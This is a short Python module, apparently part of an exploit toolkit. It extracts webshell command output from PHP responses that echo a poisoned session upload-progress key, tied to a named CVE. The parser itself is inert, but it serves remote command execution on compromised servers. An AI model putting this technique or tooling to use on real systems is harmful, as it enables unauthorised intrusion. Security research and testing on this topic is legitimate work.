# INDEX: upload-progress webshell output parser | all | response must echo session
"""Upload-progress webshell-output parser: extract a command's output from a response that echoes a
poisoned upload-progress session value (CVE-2026-109619).

Mechanism (ext/session serialize_handler=php, session.upload_progress.prefix):
  The webshell is the value of an `upload_progress_<name>` session key; when a later request echoes
  $_SESSION, the command output sits between that `upload_progress_` key prefix and the
  serialized-array tail of the record (`|a:` for the whole array, `|a:5` for its 5-field shape).

API:
  webshell_output(body, tail=b"|a:") -> stripped output text between the key prefix and `tail`, or
    the stripped body when the prefix is absent. Pure parser.

Stage: VERIFIED.
"""

KEY_PREFIX = b"upload_progress_"


def webshell_output(body, tail=b"|a:"):
    """Extract the webshell command output from `body`: the text between the `upload_progress_` key
    prefix and `tail` (e.g. b"|a:" or the stricter b"|a:5"). Returns stripped text, or the stripped
    body when the prefix is absent."""
    i = body.find(KEY_PREFIX)
    if i < 0:
        return body.decode("latin1", "replace").strip()
    rest = body[i + len(KEY_PREFIX):]
    j = rest.find(tail)
    return (rest if j < 0 else rest[:j]).decode("latin1", "replace").strip()
